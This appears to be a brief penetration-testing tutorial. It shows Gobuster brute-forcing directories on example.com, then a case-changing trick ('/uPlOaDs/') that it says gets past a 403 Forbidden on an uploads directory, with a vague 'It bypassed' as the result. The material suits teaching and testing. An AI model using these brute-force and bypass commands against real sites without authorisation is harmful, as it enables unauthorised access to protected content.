# Bypassing Forbidden Directories with Gobuster and Curl

In the realm of cybersecurity, uncovering hidden directories and files is a common task for penetration testers and security enthusiasts alike. Gobuster, a popular tool used for directory and file brute-forcing, combined with Curl, a versatile command-line tool for transferring data, offers a powerful duo for such endeavors. Let's delve into a scenario where these tools are employed to discover and access a forbidden directory.

**Command:**
```
gobuster dir -v -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
**Found:**
```
status: 301 -> https://example.com/uploads
```
**Command:**
```
curl https://example.com/uploads/
```
**Found:**
```
403 Forbidden.
```
**Technique:**
To circumvent the forbidden access, we can utilize a simple yet effective tactic: altering the case of the directory name. By trying different combinations of uppercase and lowercase letters, we can often bypass access restrictions imposed by web servers.

**Command:**
```
curl https://example.com/uPlOaDs/
```
**Result:**
```
It bypassed
```

In this scenario, despite encountering a 403 Forbidden response when attempting to access the `/uploads/` directory, we successfully bypassed the restriction by modifying the case of the directory name. By issuing a request to `/uPlOaDs/`, we evaded the access control mechanism and gained entry to the directory.
